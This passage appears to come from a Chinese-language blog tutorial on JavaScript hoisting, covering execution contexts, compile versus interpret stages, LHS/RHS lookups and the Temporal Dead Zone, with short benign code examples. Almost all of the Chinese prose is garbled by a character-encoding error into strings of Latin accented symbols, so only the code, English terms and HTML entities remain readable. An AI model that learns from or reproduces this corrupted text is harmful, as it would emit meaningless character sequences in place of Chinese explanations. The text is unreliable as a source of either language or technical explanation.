æ¯å€‹ function ä½ éƒ½å¯ä»¥æƒ³æˆå…¶å¯¦åŸ·è¡Œæœ‰å…©å€‹éšæ®µï¼Œç¬¬ä¸€å€‹éšæ®µæ˜¯é€²å…¥ ECï¼Œç¬¬äºŒå€‹éšæ®µæ‰æ˜¯çœŸçš„ä¸€è¡Œè¡ŒåŸ·è¡Œç¨‹å¼ã€‚
åœ¨é€²å…¥ EC çš„æ™‚å€™é–‹å§‹å»ºç«‹ VOï¼Œå› ç‚ºæœ‰å‚³åƒæ•¸é€²å»ï¼Œæ‰€ä»¥å…ˆæŠŠ v æ”¾åˆ° VO ä¸¦ä¸”å€¼è¨­å®šç‚º 10ï¼Œå†ä¾†å°æ–¼è£¡é¢çš„è®Šæ•¸å®£å‘Šï¼ŒVO è£¡é¢å·²ç¶“æœ‰ v é€™å€‹å±¬æ€§äº†ï¼Œæ‰€ä»¥å¿½ç•¥ä¸ç®¡ï¼Œå› æ­¤ VO å°±é•·é€™æ¨£å­ï¼š
&#123;  v: 10&#125;

é€²å…¥ EC æ¥è‘—å»ºç«‹å®Œ VO ä»¥å¾Œï¼Œæ‰é–‹å§‹ä¸€è¡Œè¡ŒåŸ·è¡Œï¼Œé€™ä¹Ÿæ˜¯ç‚ºä»€éº¼ä½ åœ¨ç¬¬äºŒè¡Œæ™‚æœƒå°å‡º 10 çš„ç·£æ•…ï¼Œå› ç‚ºåœ¨é‚£å€‹æ™‚é–“é» VO è£¡é¢çš„ v çš„ç¢ºå°±æ˜¯ 10 æ²’éŒ¯ã€‚
å¦‚æœä½ æŠŠç¨‹å¼ç¢¼æ›æˆé€™æ¨£ï¼š
function test(v)&#123;  console.log(v)  var v = 3  console.log(v)&#125;test(10)

é‚£ç¬¬äºŒå€‹å°å‡ºçš„ log å°±æœƒæ˜¯ 3ï¼Œå› ç‚ºåŸ·è¡Œå®Œç¬¬ä¸‰è¡Œä»¥å¾Œï¼Œ VO è£¡é¢çš„å€¼è¢«æ›æˆ 3 äº†ã€‚
ä»¥ä¸Šå°±æ˜¯ ES3 çš„è¦æ ¼æ›¸è£¡é¢æåˆ°çš„åŸ·è¡Œæµç¨‹ï¼Œä½ åªè¦è¨˜å¾—é€™å€‹åŸ·è¡Œæµç¨‹ï¼Œç¢°åˆ°ä»»ä½•é—œæ–¼ hoisting çš„é¡Œç›®éƒ½ä¸ç”¨æ€•ï¼Œä½ æŒ‰ç…§è¦æ ¼æ›¸çš„æ–¹æ³•å»è·‘çµ•å°æ²’éŒ¯ã€‚
ç•¶æˆ‘çŸ¥é“äº†é€™ä¸€æ®µåŸ·è¡Œæµç¨‹ä»¥å¾Œï¼Œç¬¬ä¸€å€‹æ„Ÿæƒ³æ˜¯è±ç„¶é–‹æœ—ï¼Œè¦ºå¾— hoisting ä¸å†æ˜¯ä»€éº¼ç¥ç§˜çš„æ±è¥¿ï¼Œä½ åªè¦å‡è£è‡ªå·±æ˜¯ JS å¼•æ“ï¼Œè·Ÿè‘—è·‘å°±å¥½ã€‚ç¬¬äºŒå€‹æ„Ÿæƒ³æ˜¯ï¼ŒJS åˆ°åº•æ€éº¼åšåˆ°çš„ï¼Ÿ
ç·¨è­¯èˆ‡ç›´è­¯ï¼šJS å¼•æ“åˆ°åº•æ€éº¼é‹ä½œçš„ï¼Ÿé‚„è¨˜å¾—æˆ‘ä¸Šé¢çš„æ™‚å€™æœ‰æéï¼Œä»¥å‰å­¸ç¨‹å¼çš„æ™‚å€™ä¸€ç›´æœ‰å€‹æ¦‚å¿µï¼Œé‚£å°±æ˜¯ã€Œç›´è­¯ã€ä»£è¡¨ç¨‹å¼æ˜¯ä¸€è¡Œè¡Œè·‘çš„ï¼Œè€Œ JS ä½œç‚ºä¸€å€‹ç›´è­¯çš„èªè¨€ï¼Œä¸æ˜¯ä¹Ÿè©²ä¸€è¡Œè¡Œè·‘å—ï¼Ÿ
å¯æ˜¯å¦‚æœçœŸçš„ä¸€è¡Œè¡Œè·‘ï¼Œé‚£æ€éº¼å¯èƒ½é”æˆ hoisting é€™å€‹åŠŸèƒ½ï¼Ÿä½ åœ¨åŸ·è¡Œç¬¬ n è¡Œçš„æ™‚å€™æ ¹æœ¬ä¸çŸ¥é“ n + 1 è¡Œæ˜¯ä»€éº¼ï¼Œæƒ³æå‡æ˜¯ä¸å¯èƒ½çš„ã€‚
é‡å°é€™å€‹ç–‘æƒ‘æˆ‘ä¸Šç¶²æ‰¾äº†å¾ˆä¹…çš„è³‡æ–™ï¼Œæœ€å¾Œæ‰¾åˆ°ä¸€ç¯‡çš„èªªæ³•æˆ‘è¦ºå¾—æ»¿åˆç†çš„ï¼šè™šæ‹Ÿæœºéšè°ˆï¼ˆä¸€ï¼‰ï¼šè§£é‡Šå™¨ï¼Œæ ‘éå†è§£é‡Šå™¨ï¼ŒåŸºäºæ ˆä¸åŸºäºå¯„å­˜å™¨ï¼Œå¤§æ‚çƒ©ã€‚
è£¡é¢æåˆ°äº†å¹¾é»æˆ‘è¦ºå¾—å¯«å¾—éå¸¸ä¸éŒ¯ï¼Œæœ‰ç ´é™¤äº†æˆ‘æ»¿å¤šä»¥å‰çš„è¿·æ€ï¼š
ç¬¬ä¸€ï¼Œèªè¨€ä¸€èˆ¬åªæœƒå®šç¾©æŠ½è±¡èªç¾©ï¼Œä¸æœƒå¼·åˆ¶ç”¨æŸç¨®æ–¹å¼å¯¦ç¾ï¼Œåƒæ˜¯ C æˆ‘å€‘æœƒèªªå®ƒæ˜¯ç·¨è­¯å‹èªè¨€ï¼Œå¯æ˜¯ C ä¹Ÿæœ‰ç›´è­¯å™¨ã€‚æ‰€ä»¥ç•¶æˆ‘å€‘åœ¨èªªæŸç¨®ç¨‹å¼èªè¨€æ˜¯ç›´è­¯æˆ–ç·¨è­¯å‹çš„æ™‚å€™ï¼Œå…¶å¯¦æ˜¯åœ¨æŒ‡æ¶‰ã€Œå¤§å¤šæ•¸ã€è€Œä¸æ˜¯å…¨éƒ¨ã€‚
æ›è¨€ä¹‹ï¼Œæˆ‘å€‘èªª JavaScript æ˜¯ç›´è­¯å‹èªè¨€ï¼Œä¸ä»£è¡¨ JavaScript ä¸èƒ½æœ‰ç·¨è­¯å™¨ï¼Œåä¹‹äº¦ç„¶ã€‚
ç¬¬äºŒï¼Œç›´è­¯å™¨è·Ÿç·¨è­¯å™¨æœ€å¤§çš„å·®åˆ¥åœ¨æ–¼ã€ŒåŸ·è¡Œã€ã€‚
ç·¨è­¯é€™å€‹æ­¥é©Ÿå°±æ˜¯æŠŠåŸå§‹ç¢¼ A ç·¨è­¯ç‚ºç›®çš„ç¢¼ Bï¼Œå°±é€™æ¨£è€Œå·²ï¼Œä½†ä½ è¦ä¿è­‰ A è·Ÿ B åŸ·è¡Œå®Œçš„çµæœè¦ç›¸åŒã€‚
è€Œç›´è­¯å°±æ˜¯ä½ è¼¸å…¥åŸå§‹ç¢¼ Aï¼Œè¼¸å‡ºå°±ç›´æ¥æ˜¯ä½ ç¨‹å¼ç¢¼è£¡é¢è¦åŸ·è¡Œçš„èªç¾©ï¼Œè£¡é¢æ€éº¼åšçš„æ˜¯ä¸€å€‹é»‘ç®±å­ã€‚
åŸæ–‡è£¡é¢æœ‰ä¸€å¼µåœ–ç•«å¾—å¾ˆä¸éŒ¯ï¼š

æ‰€ä»¥ç›´è­¯å™¨è£¡é¢ä¹Ÿèƒ½æœ‰ç·¨è­¯ï¼Œé€™æ˜¯ä¸è¡çªçš„ï¼Œæˆ–æ˜¯ä½ ä¹Ÿå¯ä»¥å¯«ä¸€å€‹è¶…ç°¡å–®ç›´è­¯å™¨ï¼Œå°±æ˜¯ä½ è¼¸å…¥åŸå§‹ç¢¼ä»¥å¾Œå¹«ä½ ç·¨è­¯å®Œç„¶å¾ŒåŸ·è¡Œã€‚
äº‹å¯¦ä¸Šå¾ˆå¤šç¨®ç›´è­¯å™¨å…§éƒ¨çš„é‹ä½œæ–¹å¼éƒ½æ˜¯å…ˆæŠŠåŸå§‹ç¢¼ç·¨è­¯æˆæŸç¨®ä¸­é–“ç¢¼å†å»åŸ·è¡Œï¼Œæ‰€ä»¥ç·¨è­¯é€™å€‹æ­¥é©Ÿé‚„æ˜¯å¾ˆå¸¸è¦‹çš„ï¼Œè€Œ JS ä¹Ÿæ˜¯é€™æ¨£é‹ä½œçš„ã€‚
ç•¶ä½ æ‹‹é–‹ä»¥å‰é‚£ç¨®ã€ŒJS å°±æ˜¯è¦ä¸€è¡Œè¡ŒåŸ·è¡Œã€çš„èˆŠè§€å¿µä¸¦æ“æŠ±ã€Œå…¶å¯¦ä¸»æµ JS å¼•æ“éƒ½æœ‰ç·¨è­¯é€™å€‹æ­¥é©Ÿã€çš„æƒ³æ³•å¾Œï¼Œä½ å°±ä¸æœƒè¦ºå¾— hoisting æ˜¯ç„¡æ³•é”æˆçš„äº‹æƒ…äº†ã€‚
å‰é¢æˆ‘å€‘å·²ç¶“æœ‰çœ‹è¦æ ¼ï¼ŒçŸ¥é“åœ¨ ES3 è£¡é¢çš„é‹è¡Œæ¨¡å¼ä¸¦ä¸”çŸ¥é“ VO é€™å€‹æ±è¥¿ï¼Œä½†è¦æ ¼è£¡é¢æè¿°çš„ä¹Ÿåªæ˜¯æŠ½è±¡çš„æ±è¥¿ï¼Œå®ƒä¸¦æ²’æœ‰å¯«èªªã€Œå¯¦éš›ä¸Šã€æ˜¯åœ¨å“ªå€‹åœ°æ–¹åšè™•ç†çš„ï¼Œè€Œé€™åœ°æ–¹å…¶å¯¦å°±æ˜¯ç·¨è­¯éšæ®µã€‚
è©±èªªé—œæ–¼é€™å€‹ç·¨è­¯ç›´è­¯çš„å•é¡Œå…¶å¯¦æˆ‘å¡æ»¿ä¹…çš„ï¼Œå› ç‚ºä»¥å‰è§€å¿µä¸æ­£ç¢ºçš„åœ°æ–¹å¾ˆå¤šï¼Œç¾åœ¨æ…¢æ…¢æŠŠå®ƒä¿®æ­£éä¾†ï¼Œè€Œå°æ–¼ hoisting å…¶å¯¦æˆ‘ä¹‹å‰æœ‰é»åˆ†ä¸æ¸…æ¥šè¦æ ¼è·Ÿå¯¦ä½œçš„å·®åˆ¥ï¼Œå¾Œä¾†é‚„è·‘å»å•äº†You-Dont-Know-JS çš„ä½œè€…ï¼Œä¹Ÿå¾ˆå¹¸é‹åœ°å¾—åˆ°å›è¦†ï¼Œæœ‰èˆˆè¶£çš„äººå¯ä»¥çœ‹çœ‹ï¼šhttps://github.com/getify/You-Dont-Know-JS/issues/1375ã€‚
JS å¼•æ“çš„é‹ä½œå¦‚åŒæˆ‘ä¸Šé¢æ‰€èªªçš„ï¼Œå…¶å¯¦ç¾åœ¨ä¸»æµ JS å¼•æ“å…§éƒ¨éƒ½æœƒæœ‰ç·¨è­¯é€™å€‹éšæ®µï¼Œè€Œ hoisting å…¶å¯¦å°±æ˜¯åœ¨ç·¨è­¯é€™å€‹éšæ®µåšè™•ç†çš„ã€‚å¼•å…¥äº†ç·¨è­¯éšæ®µä»¥å¾Œï¼Œå¯ä»¥æŠŠ JS åˆ†æˆç·¨è­¯éšæ®µè·ŸåŸ·è¡Œéšæ®µå…©å€‹æ­¥é©Ÿã€‚
åœ¨ç·¨è­¯éšæ®µçš„æ™‚å€™ï¼Œæœƒè™•ç†å¥½æ‰€æœ‰çš„è®Šæ•¸åŠå‡½å¼å®£å‘Šä¸¦ä¸”åŠ å…¥åˆ° scope è£¡é¢ï¼Œåœ¨åŸ·è¡Œçš„æ™‚å€™å°±ä¸€æ¨£å¯ä»¥å»ä½¿ç”¨å®ƒã€‚è©³ç´°æƒ…å½¢é€™ä¸€ç¯‡å¯«å¾—å¾ˆå¥½ï¼šHoisting in JavaScript
ï¼Œæˆ‘ä¸‹é¢å°±ç›´æ¥æ”¹ä¸€ä¸‹è£¡é¢çš„ç¨‹å¼ç¢¼ç•¶åšä¾‹å­ã€‚
èˆ‰ä¾‹ä¾†èªªï¼Œæˆ‘æœ‰é€™æ¨£ä¸€æ®µç¨‹å¼ç¢¼ï¼š
var foo = &quot;bar&quot;var a = 1function bar() &#123;    foo = &quot;inside bar&quot;    var a = 2    c = 3    console.log(c)    console.log(d)&#125;bar()

åœ¨ç·¨è­¯éšæ®µçš„æ™‚å€™æœƒè™•ç†å®£å‘Šçš„éƒ¨åˆ†ï¼Œæ‰€ä»¥æœƒæ˜¯é€™æ¨£ï¼š
Line 1ï¼šglobal scopeï¼Œæˆ‘è¦å®£å‘Šä¸€å€‹è®Šæ•¸å«åš fooLine 2ï¼šglobal scopeï¼Œæˆ‘è¦å®£å‘Šä¸€å€‹è®Šæ•¸å«åš aLine 3ï¼šglobal scopeï¼Œæˆ‘è¦å®£å‘Šä¸€å€‹å‡½å¼å«åš barLine 4ï¼šæ²’æœ‰ä»»ä½•è®Šæ•¸å®£å‘Šï¼Œä¸åšäº‹Line 5ï¼šbar scopeï¼Œæˆ‘è¦å®£å‘Šä¸€å€‹è®Šæ•¸å«åš aLine 6ï¼šæ²’æœ‰ä»»ä½•è®Šæ•¸å®£å‘Šï¼Œä¸åšäº‹Line 7ï¼šæ²’æœ‰ä»»ä½•è®Šæ•¸å®£å‘Šï¼Œä¸åšäº‹Line 8ï¼šæ²’æœ‰ä»»ä½•è®Šæ•¸å®£å‘Šï¼Œä¸åšäº‹

è™•ç†å®Œå¾Œçš„æ±è¥¿å·®ä¸å¤šå°±é•·é€™æ¨£ï¼š
globalScope: &#123;  foo: undefined,  a: undefined,  bar: function&#125;  barScope: &#123;  a: undefined&#125;

å†ä¾†é€²å…¥åˆ°åŸ·è¡Œéšæ®µï¼Œé€™é‚Šæœ‰å…©å€‹å°ˆæœ‰åè©å…ˆè¨˜ä¸€ä¸‹ï¼Œåœ¨ä»‹ç´¹ä¹‹å‰æˆ‘å…ˆçµ¦ä¸€å€‹ç¯„ä¾‹æœƒæ¯”è¼ƒå¥½ç†è§£ï¼š
var a = 10console.log(a)

ä¸Šé¢é€™å…©è¡Œæœ‰å€‹å·®ç•°ï¼Œç¬¬ä¸€è¡Œçš„æ™‚å€™æˆ‘å€‘åªéœ€è¦çŸ¥é“ã€Œa çš„è¨˜æ†¶é«”ä½ç½®åœ¨å“ªè£¡ã€å°±å¥½ï¼Œæˆ‘å€‘ä¸é—œå¿ƒå®ƒçš„å€¼æ˜¯ä»€éº¼ã€‚
è€Œç¬¬äºŒè¡Œå‰‡æ˜¯ã€Œæˆ‘å€‘åªé—œå¿ƒå®ƒçš„å€¼æ˜¯ä»€éº¼ï¼ŒæŠŠå€¼çµ¦æˆ‘å°±å¥½ã€ï¼Œæ‰€ä»¥å„˜ç®¡å…©è¡Œè£¡é¢éƒ½æœ‰aï¼Œä½†ä½ å¯ä»¥çœ‹å‡ºä¾†ä»–å€‘æ‰€è¦åšçš„äº‹æƒ…æ˜¯ä¸ä¸€æ¨£çš„ã€‚
è€Œç¬¬ä¸€è¡Œçš„ a æˆ‘å€‘å«å®ƒ LHSï¼ˆLeft hand sideï¼‰å¼•ç”¨ï¼Œç¬¬äºŒè¡Œå«å®ƒ RHSï¼ˆRight hand sideï¼‰å¼•ç”¨ï¼Œé€™é‚Šçš„ left è·Ÿ right æŒ‡çš„æ˜¯ç›¸å°æ–¼ç­‰è™Ÿçš„å·¦å³é‚Šï¼Œä½†ç”¨é€™ç¨®æ–¹å¼ç†è§£çš„è©±å…¶å¯¦ä¸å¤ ç²¾ç¢ºï¼Œå› æ­¤åƒä¸‹é¢é€™æ¨£è¨˜å°±å¥½ï¼š
LHSï¼šè«‹å¹«æˆ‘å»æŸ¥é€™å€‹è®Šæ•¸çš„ä½ç½®åœ¨å“ªè£¡ï¼Œå› ç‚ºæˆ‘è¦å°å®ƒè³¦å€¼ã€‚RHSï¼šè«‹å¹«æˆ‘æŸ¥è©¢é€™å€‹è®Šæ•¸çš„å€¼æ˜¯ä»€éº¼ï¼Œå› ç‚ºæˆ‘è¦ç”¨é€™å€‹å€¼ã€‚
æœ‰äº†é€™å€‹æ¦‚å¿µä»¥å¾Œï¼Œå†çœ‹ä¸€æ¬¡ä¸Šé¢çš„ç¯„ä¾‹ç¨‹å¼ç¢¼ï¼Œå°±å¯ä»¥ä¸€æ­¥ä¸€æ­¥ä¾†è§£é‡‹ï¼š
var foo = &quot;bar&quot;var a = 1function bar() &#123;    foo = &quot;inside bar&quot;    var a = 2    c = 3    console.log(c)    console.log(d)&#125;bar()

Line 1ï¼švar foo &#x3D; â€œbarâ€JS å¼•æ“ï¼šglobal scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° foo çš„ LHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼šscope èªªæœ‰ï¼Œæ‰€ä»¥æˆåŠŸæ‰¾åˆ° foo ä¸¦ä¸”è³¦å€¼  
é€™æ™‚å€™çš„ global scopeï¼š
&#123;  foo: &quot;bar&quot;,  a: undefined,  bar: function&#125;

Line 2ï¼švar a &#x3D; 1JS å¼•æ“ï¼šglobal scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° a çš„ LHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼šscope èªªæœ‰ï¼Œæ‰€ä»¥æˆåŠŸæ‰¾åˆ° a ä¸¦ä¸”è³¦å€¼
é€™æ™‚å€™çš„ global scopeï¼š
&#123;  foo: &quot;bar&quot;,  a: 1,  bar: function&#125;

Line 10ï¼šbar()JS å¼•æ“ï¼šglobal scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° bar çš„ RHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼šscope èªªæœ‰ï¼Œæ‰€ä»¥æˆåŠŸè¿”å› bar çš„å€¼ä¸¦ä¸”å‘¼å« function
Line 4ï¼šfoo &#x3D; â€œinside barâ€JS å¼•æ“ï¼šbar scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° foo çš„ LHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼šbar scope èªªæ²’æœ‰ï¼Œæ‰€ä»¥å»å•ä¸Šä¸€å±¤çš„ global scopeJS å¼•æ“ï¼šglobal scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° foo çš„ LHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼šæœ‰ï¼Œæ‰€ä»¥æˆåŠŸæ‰¾åˆ° foo ä¸¦ä¸”è³¦å€¼
é€™æ™‚å€™çš„ global scopeï¼š
&#123;  foo: &quot;inside bar&quot;,  a: 1,  bar: function&#125;

Line 5ï¼švar a &#x3D; 2JS å¼•æ“ï¼šbar scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° a çš„ LHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼šbar scope èªªæœ‰ï¼Œæ‰€ä»¥æˆåŠŸæ‰¾åˆ° a ä¸¦ä¸”è³¦å€¼
æ­¤æ™‚çš„ bar scopeï¼š
&#123;  a: 2&#125;

Line 6ï¼šc &#x3D; 3JS å¼•æ“ï¼šbar scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° c çš„ LHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼šbar scope èªªæ²’æœ‰ï¼Œæ‰€ä»¥å»å•ä¸Šä¸€å±¤çš„ global scopeJS å¼•æ“ï¼šglobal scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° c çš„ LHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼šæ²’æœ‰ã€‚
é€™æ™‚å€™æœ‰å¹¾ç¨®çµæœï¼Œå¦‚æœä½ æ˜¯è™•åœ¨åš´æ ¼æ¨¡å¼åº•ä¸‹ï¼ˆuse strictï¼‰ï¼Œæœƒè¿”å› ReferenceError: c is not defined éŒ¯èª¤ï¼Œå¦‚æœä½ ä¸æ˜¯åœ¨åš´æ ¼æ¨¡å¼ï¼Œé‚£ global scope å°±æœƒæŠŠ c åŠ ä¸Šå»ä¸¦ä¸”è¨­å®šæˆ 3ï¼Œé€™é‚Šå…ˆå‡è¨­æˆ‘å€‘ä¸æ˜¯åœ¨åš´æ ¼æ¨¡å¼ã€‚
æ­¤æ™‚çš„ global scopeï¼š
&#123;  foo: &quot;inside bar&quot;,  a: 1,  bar: function,  c: 3&#125;

Line 7ï¼šconsole.log(c)JS å¼•æ“ï¼šbar scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° c çš„ RHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼šbar scope èªªæ²’æœ‰ï¼Œæ‰€ä»¥å»å•ä¸Šä¸€å±¤çš„ global scopeJS å¼•æ“ï¼šglobal scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° c çš„ RHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼šglobal scope èªªæœ‰ï¼Œæ‰€ä»¥æˆåŠŸè¿”å› c çš„å€¼ä¸¦ä¸”å‘¼å« console.log
Line 8ï¼šconsole.log(d)JS å¼•æ“ï¼šbar scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° d çš„ RHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼šbar scope èªªæ²’æœ‰ï¼Œæ‰€ä»¥å»å•ä¸Šä¸€å±¤çš„ global scopeJS å¼•æ“ï¼šglobal scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° d çš„ RHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼šglobal scope èªªæ²’æœ‰ï¼Œæ‰€ä»¥è¿”å›éŒ¯èª¤ ReferenceError: d is not defined
ä»¥ä¸Šå°±æ˜¯ JS å¼•æ“çš„é‹ä½œæµç¨‹ï¼Œæƒ³æ›´è©³ç´°äº†è§£çš„è©±å¯åƒè€ƒï¼šYou Donâ€™t Know JS: Scope &amp; Closuresã€Chapter 4: Hoistingã€Hoisting in JavaScriptã€‚
ä¸­å ´ç¸½çµå†æ¬¡å›é¡§ä¸€ä¸‹æˆ‘å€‘é–‹å ´æ”¾çš„é‚£åå€‹é …ç›®ï¼š

ä½ çŸ¥é“ä»€éº¼æ˜¯ hoisting
ä½ çŸ¥é“ hoisting åªæœƒæå‡å®£å‘Šè€Œéè³¦å€¼
ä½ çŸ¥é“ function å®£å‘Šã€function çš„åƒæ•¸ä»¥åŠä¸€èˆ¬è®Šæ•¸å®£å‘ŠåŒæ™‚å‡ºç¾æ™‚çš„æå‡å„ªå…ˆé †åº
ä½ çŸ¥é“ let è·Ÿ const æ²’æœ‰ hoisting
ä½ çŸ¥é“ç¬¬äº”é»æ˜¯éŒ¯çš„ï¼Œå…¶å¯¦æœ‰ä½†åªæ˜¯è¡¨ç¾å½¢å¼ä¸ä¸€æ¨£
ä½ çŸ¥é“æœ‰é—œç¬¬å…­é»ï¼Œæœ‰å€‹æ¦‚å¿µå«åš TDZï¼ˆTemporal Dead Zoneï¼‰
ä½ çœ‹é ES3 çš„è¦æ ¼æ›¸ï¼ŒçŸ¥é“è£¡é¢æ˜¯æ€éº¼æè¿°çš„
ä½ çœ‹é ES6 çš„è¦æ ¼æ›¸ï¼ŒçŸ¥é“è£¡é¢æ˜¯æ€éº¼æè¿°çš„
ä½ çŸ¥é“ hoisting èƒŒå¾Œçš„åŸç†æ˜¯ä»€éº¼
ä½ çœ‹é V8 ç·¨è­¯å‡ºä¾†çš„ç¨‹å¼ç¢¼

æˆ‘å€‘ç”¨äº†è¨±å¤šç¯‡å¹…æŠŠå…¶ä¸­çš„ä¸ƒé»éƒ½è¬›å®Œäº†ï¼Œå‰©ä¸‹çš„æ˜¯ï¼š

ä½ çŸ¥é“æœ‰é—œç¬¬å…­é»ï¼Œæœ‰å€‹æ¦‚å¿µå«åš TDZï¼ˆTemporal Dead Zoneï¼‰
ä½ çœ‹é ES6 çš„è¦æ ¼æ›¸ï¼ŒçŸ¥é“è£¡é¢æ˜¯æ€éº¼æè¿°çš„
ä½ çœ‹é V8 ç·¨è­¯å‡ºä¾†çš„ç¨‹å¼ç¢¼

é—œæ–¼ ES6 çš„è¦æ ¼é‚£é»æˆ‘ä¸æ‰“ç®—è©³ç´°è¬›ï¼ˆè€Œä¸”æˆ‘ä¹Ÿé‚„æ²’è©³ç´°çœ‹å®Œï¼‰ï¼Œå› ç‚ºè®ŠåŒ–é‚„æ»¿å¤šçš„ä½†åŸºæœ¬ä¸ŠåŸç†ä¸è®Šï¼Œå°±æ˜¯å¤šäº†ä¸€äº›å°ˆæœ‰åè©è€Œå·²ï¼Œæƒ³çŸ¥é“çš„å¯ä»¥åƒè€ƒé€™ç¯‡ç¶“å…¸å¥½æ–‡ï¼šECMA-262-5 in detail. Chapter 3.2. Lexical environments: ECMAScript implementation.ã€‚
ä¸Šé¢æˆ‘å€‘å·²ç¶“è¬›äº†å¾ˆå¤šæ±è¥¿ï¼Œæ‰€æœ‰è·Ÿ hoisting æœ‰é—œçš„é‹ä½œæ©Ÿåˆ¶å…¨éƒ¨éƒ½è¬›å®Œäº†ï¼Œä½†æˆ‘ç›¸ä¿¡ä¾ç„¶éœ€è¦ä¸€é»æ™‚é–“å¸æ”¶ï¼Œä½†æˆ‘ç›¸ä¿¡å¸æ”¶å®Œä»¥å¾Œä½ æœƒè¦ºå¾—ç¥æ¸…æ°£çˆ½ï¼Œæƒ³èªª hoisting ä¸éå¦‚æ­¤è€Œå·²ã€‚
æ¥è‘—å‘¢ï¼Œæˆ‘å€‘å°±è¦é€²å…¥åˆ°é€™ç¯‡æ–‡ç« æœ€å¾Œçš„éƒ¨åˆ†äº†ï¼Œä¹Ÿå°±æ˜¯ TDZ ä»¥åŠ V8ã€‚
Temporal Dead Zoneé‚„è¨˜å¾—æˆ‘å€‘èªªé let èˆ‡ const å…¶å¯¦æœ‰ hoisting å—ï¼Ÿä¸¦ä¸”èˆ‰äº†ä¸€å€‹å°ç¯„ä¾‹ä¾†é©—è­‰é€™ä»¶äº‹æƒ…ã€‚
let èˆ‡ const ç¢ºå¯¦æœ‰ hoistingï¼Œèˆ‡ var çš„å·®åˆ¥åœ¨æ–¼æå‡ä¹‹å¾Œï¼Œvar å®£å‘Šçš„è®Šæ•¸æœƒè¢«åˆå§‹åŒ–ç‚º undefinedï¼Œè€Œ let èˆ‡ const çš„å®£å‘Šä¸æœƒè¢«åˆå§‹åŒ–ç‚º undefinedï¼Œè€Œä¸”å¦‚æœä½ åœ¨ã€Œè³¦å€¼ä¹‹å‰ã€å°±å­˜å–å®ƒï¼Œå°±æœƒæ‹‹å‡ºéŒ¯èª¤ã€‚
åœ¨ã€Œæå‡ä¹‹å¾Œã€ä»¥åŠã€Œè³¦å€¼ä¹‹å‰ã€é€™æ®µã€ŒæœŸé–“ã€ï¼Œå¦‚æœä½ å­˜å–å®ƒå°±æœƒæ‹‹å‡ºéŒ¯èª¤ï¼Œè€Œé€™æ®µæœŸé–“å°±ç¨±åšæ˜¯ TDZï¼Œå®ƒæ˜¯ä¸€å€‹ç‚ºäº†è§£é‡‹ let èˆ‡ const çš„ hoisting è¡Œç‚ºæ‰€æå‡ºçš„ä¸€å€‹åè©ã€‚
æˆ‘å€‘ç”¨ä¸‹é¢çš„ç¨‹å¼ç¢¼ç•¶åšä¾‹å­ï¼š
function test() &#123;    var a = 1; // c çš„ TDZ é–‹å§‹    var b = 2;    console.log(c) // éŒ¯èª¤    if (a &gt; 1) &#123;      console.log(a)    &#125;    let c = 10 // c çš„ TDZ çµæŸ&#125;test()

ç•¶ä½ åœ¨ç¬¬å…«è¡ŒåŸ·è¡Œä»¥å‰è©¦åœ–å­˜å– c çš„è©±ï¼Œå°±æœƒæ‹‹å‡ºéŒ¯èª¤ã€‚è¦æ³¨æ„çš„æ˜¯ TDZ ä¸¦ä¸æ˜¯ä¸€å€‹ç©ºé–“ä¸Šçš„æ¦‚å¿µï¼Œè€Œæ˜¯æ™‚é–“ï¼Œä¾‹å¦‚èªªä»¥ä¸‹ç¨‹å¼ç¢¼ï¼š
function test() &#123;    yo() // c çš„ TDZ é–‹å§‹    let c = 10 // c çš„ TDZ çµæŸ    function yo()&#123;      console.log(c)    &#125;&#125;test()

åœ¨ä½ é€²å…¥ test é€™å€‹ function çš„æ™‚å€™ï¼Œå°±å·²ç¶“æ˜¯ c çš„ TDZ äº†ï¼Œæ‰€ä»¥ç•¶ä½ åŸ·è¡Œ yo ä¸¦ä¸”åŸ·è¡Œåˆ°console.log(c)æ™‚ï¼Œéƒ½é‚„åœ¨ TDZ è£¡é¢ï¼Œè¦ä¸€ç›´ç­‰åˆ°let c = 10è¢«åŸ·è¡Œ TDZ æ‰æœƒçµæŸã€‚
æ‰€ä»¥ä¸¦ä¸æ˜¯èªªæˆ‘æŠŠconsole.log(c)æ”¾åœ¨let c = 10ä¸‹é¢å°±æ²’å•é¡Œäº†ï¼Œè€Œæ˜¯åœ¨ã€ŒåŸ·è¡Œé †åºã€ä¸Šè¦åœ¨å¾Œé¢ã€‚
æˆ–æ˜¯ä½ ä¹Ÿå¯ä»¥æ‹‹é–‹é€™äº›åè©ï¼Œç”¨ä¸€å¥è©±ç¸½çµï¼š

